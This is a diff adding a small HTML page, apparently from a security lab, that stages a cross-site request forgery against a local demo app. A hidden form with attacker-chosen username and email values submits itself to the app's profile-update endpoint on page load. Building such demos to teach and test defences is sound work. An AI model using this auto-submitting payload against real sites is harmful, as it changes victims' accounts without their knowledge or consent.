@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Attack Against Vulnerable Demo</title>
+</head>
+<body>
+  <h1>CSRF Attack Demo</h1>
+  <p>This page silently submits a profile update to the vulnerable app on port 5001.</p>
+  <form id="csrf" method="post" action="http://127.0.0.1:5001/profile/update">
+    <input type="hidden" name="username" value="csrf_owned_user">
+    <input type="hidden" name="email" value="csrf-owned@example.com">
+  </form>
+  <script>
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
